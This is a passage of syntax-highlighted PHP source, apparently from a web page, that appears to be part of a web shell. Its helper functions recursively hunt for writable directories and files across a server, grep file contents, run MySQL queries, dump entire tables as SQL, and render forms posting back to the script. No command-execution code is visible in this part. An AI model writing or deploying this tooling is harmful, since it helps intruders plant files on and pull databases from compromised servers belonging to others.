</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        while ($file = readdir($dh)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $f = str_replace(&#39;//&#39;, &#39;/&#39;, $dir . &#39;/&#39; . $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39; &amp;&amp; is_dir($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (is_writable($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;filename&#39;] = str_replace($nowpath, &#39;&#39;, $f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;mtime&#39;] = @date(&#39;Y-m-d H:i:s&#39;, filemtime($f));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;dirchmod&#39;] = getChmod($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;dirperm&#39;] = getPerms($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;dirlink&#39;] = $dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dirdata[$j][&#39;server_link&#39;] = $f;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $j++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                GetWDirList($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        closedir($dh);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        clearstatcache();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return $dirdata;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function GetWFileList($dir)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $filedata, $j, $nowpath, $writabledb;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$j &amp;&amp; $j = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($dh = opendir($dir)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        while ($file = readdir($dh)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $ext = getext($file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $f = str_replace(&#39;//&#39;, &#39;/&#39;, $dir . &#39;/&#39; . $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39; &amp;&amp; is_dir($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                GetWFileList($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            } elseif ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39; &amp;&amp; is_file($f) &amp;&amp; in_array($ext, explode(&#39;,&#39;, $writabledb))) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (is_writable($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;filename&#39;] = str_replace($nowpath, &#39;&#39;, $f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;size&#39;] = sizecount(@filesize($f));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;mtime&#39;] = @date(&#39;Y-m-d H:i:s&#39;, filemtime($f));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;filechmod&#39;] = getChmod($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;fileperm&#39;] = getPerms($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;fileowner&#39;] = getUser($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;dirlink&#39;] = $dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;server_link&#39;] = $f;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $j++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        closedir($dh);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        clearstatcache();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return $filedata;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function GetSFileList($dir, $content, $re = 0)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $filedata, $j, $nowpath, $writabledb;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$j &amp;&amp; $j = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($dh = opendir($dir)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        while ($file = readdir($dh)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $ext = getext($file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $f = str_replace(&#39;//&#39;, &#39;/&#39;, $dir . &#39;/&#39; . $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39; &amp;&amp; is_dir($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                GetSFileList($f, $content, $re = 0);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            } elseif ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39; &amp;&amp; is_file($f) &amp;&amp; in_array($ext, explode(&#39;,&#39;, $writabledb))) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $find = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if ($re) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (preg_match(&#39;@&#39; . $content . &#39;@&#39;, $file) || preg_match(&#39;@&#39; . $content . &#39;@&#39;, @file_get_contents($f))) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $find = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $find = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if ($find) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;filename&#39;] = str_replace($nowpath, &#39;&#39;, $f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;size&#39;] = sizecount(@filesize($f));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;mtime&#39;] = @date(&#39;Y-m-d H:i:s&#39;, filemtime($f));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;filechmod&#39;] = getChmod($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;fileperm&#39;] = getPerms($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;fileowner&#39;] = getUser($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;dirlink&#39;] = $dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $filedata[$j][&#39;server_link&#39;] = $f;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $j++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        closedir($dh);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        clearstatcache();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return $filedata;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function qy($sql)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $mysqllink;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    //echo $sql.&#39;&lt;br&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $res = $error = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (!$res = @mysql_query($sql, $mysqllink)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else if (is_resource($res)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return 2;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function q($sql)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $mysqllink;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return @mysql_query($sql, $mysqllink);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function fr($qy)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    mysql_free_result($qy);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function sizecount($fileSize)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $size = sprintf(&#34;%u&#34;, $fileSize);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($size == 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return &#39;0 Bytes&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $sizename = array(&#39; Bytes&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;, &#39; PB&#39;, &#39; EB&#39;, &#39; ZB&#39;, &#39; YB&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 备份数据库
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function sqldumptable($table, $fp = 0)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $mysqllink;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $tabledump = &#34;DROP TABLE IF EXISTS `$table`;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $res = q(&#34;SHOW CREATE TABLE $table&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $create = mysql_fetch_row($res);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $tabledump .= $create[1] . &#34;;\n\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($fp) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        fwrite($fp, $tabledump);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo $tabledump;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $tabledump = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $rows = q(&#34;SELECT * FROM $table&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    while ($row = mysql_fetch_assoc($rows)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        foreach ($row as $k =&gt; $v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $row[$k] = &#34;&#39;&#34; . @mysql_real_escape_string($v) . &#34;&#39;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $tabledump = &#39;INSERT INTO `&#39; . $table . &#39;` VALUES (&#39; . implode(&#34;, &#34;, $row) . &#39;);&#39; . &#34;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($fp) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            fwrite($fp, $tabledump);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            echo $tabledump;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    fwrite($fp, &#34;\n\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    fr($rows);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function p($str)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo $str . &#34;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function tbhead()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;table width=&#34;100%&#34; border=&#34;0&#34; cellpadding=&#34;4&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function tbfoot()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;/table&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function makehide($name, $value = &#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#34;&lt;input id=\&#34;$name\&#34; type=\&#34;hidden\&#34; name=\&#34;$name\&#34; value=\&#34;$value\&#34; /&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function makeinput($arg = array())
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;size&#39;] = $arg[&#39;size&#39;] &gt; 0 ? &#34;size=\&#34;$arg[size]\&#34;&#34; : &#34;size=\&#34;100\&#34;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;extra&#39;] = $arg[&#39;extra&#39;] ? $arg[&#39;extra&#39;] : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;type&#39;] &amp;&amp; $arg[&#39;type&#39;] = &#39;text&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;title&#39;] = $arg[&#39;title&#39;] ? $arg[&#39;title&#39;] . &#39;&lt;br /&gt;&#39; : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;class&#39;] = $arg[&#39;class&#39;] ? $arg[&#39;class&#39;] : &#39;input&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($arg[&#39;newline&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#34;&lt;p&gt;$arg[title]&lt;input class=\&#34;$arg[class]\&#34; name=\&#34;$arg[name]\&#34; id=\&#34;$arg[name]\&#34; value=\&#34;$arg[value]\&#34; type=\&#34;$arg[type]\&#34; $arg[size] $arg[extra] /&gt;&lt;/p&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#34;$arg[title]&lt;input class=\&#34;$arg[class]\&#34; name=\&#34;$arg[name]\&#34; id=\&#34;$arg[name]\&#34; value=\&#34;$arg[value]\&#34; type=\&#34;$arg[type]\&#34; $arg[size] $arg[extra] /&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function makeselect($arg = array())
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($arg[&#39;onchange&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $onchange = &#39;onchange=&#34;&#39; . $arg[&#39;onchange&#39;] . &#39;&#34;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;title&#39;] = $arg[&#39;title&#39;] ? $arg[&#39;title&#39;] : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($arg[&#39;newline&#39;])
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#34;$arg[title] &lt;select class=\&#34;input\&#34; id=\&#34;$arg[name]\&#34; name=\&#34;$arg[name]\&#34; $onchange&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (is_array($arg[&#39;option&#39;])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($arg[&#39;nokey&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            foreach ($arg[&#39;option&#39;] as $value) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if ($arg[&#39;selected&#39;] == $value) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#34;&lt;option value=\&#34;$value\&#34; selected&gt;$value&lt;/option&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#34;&lt;option value=\&#34;$value\&#34;&gt;$value&lt;/option&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            foreach ($arg[&#39;option&#39;] as $key =&gt; $value) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if ($arg[&#39;selected&#39;] == $key) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#34;&lt;option value=\&#34;$key\&#34; selected&gt;$value&lt;/option&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#34;&lt;option value=\&#34;$key\&#34;&gt;$value&lt;/option&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#34;&lt;/select&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($arg[&#39;newline&#39;])
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function formhead($arg = array())
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $self;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;method&#39;] &amp;&amp; $arg[&#39;method&#39;] = &#39;post&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;action&#39;] &amp;&amp; $arg[&#39;action&#39;] = $self;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;target&#39;] = $arg[&#39;target&#39;] ? &#34;target=\&#34;$arg[target]\&#34;&#34; : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;name&#39;] &amp;&amp; $arg[&#39;name&#39;] = &#39;form1&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#34;&lt;form name=\&#34;$arg[name]\&#34; id=\&#34;$arg[name]\&#34; action=\&#34;$arg[action]\&#34; method=\&#34;$arg[method]\&#34; $arg[target]&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($arg[&#39;title&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;h2&gt;&#39; . $arg[&#39;title&#39;] . &#39; »&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function maketext($arg = array())
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;cols&#39;] &amp;&amp; $arg[&#39;cols&#39;] = 100;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$arg[&#39;rows&#39;] &amp;&amp; $arg[&#39;rows&#39;] = 25;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $arg[&#39;title&#39;] = $arg[&#39;title&#39;] ? $arg[&#39;title&#39;] . &#39;&lt;br /&gt;&#39; : &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#34;&lt;p&gt;$arg[title]&lt;textarea class=\&#34;area\&#34; id=\&#34;$arg[name]\&#34; name=\&#34;$arg[name]\&#34; cols=\&#34;$arg[cols]\&#34; rows=\&#34;$arg[rows]\&#34; $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function formfooter($name = &#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$name &amp;&amp; $name = &#39;submit&#39;;
